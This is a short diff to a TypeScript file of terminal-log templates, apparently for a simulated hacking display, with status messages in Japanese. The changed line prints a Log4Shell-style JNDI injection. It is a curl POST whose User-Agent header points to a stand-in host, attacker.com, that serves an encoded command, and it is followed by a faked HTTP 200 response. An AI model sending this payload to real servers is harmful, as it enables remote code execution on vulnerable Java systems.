@@ -47,7 +47,7 @@ export const phase3Templates: LogTemplate[] = [
     task: "PAYLOAD FINAL",
   },
   {
-    log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/",
+    log: "curl -i -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nContent-Length: 0\nDate: Mon, 23 Feb 2026 10:24:12 GMT\nConnection: close",
     msg: "ターゲットの8080ポートへHTTP POSTリクエストを送信中。",
     task: "EXPLOIT EXECUTION",
   },
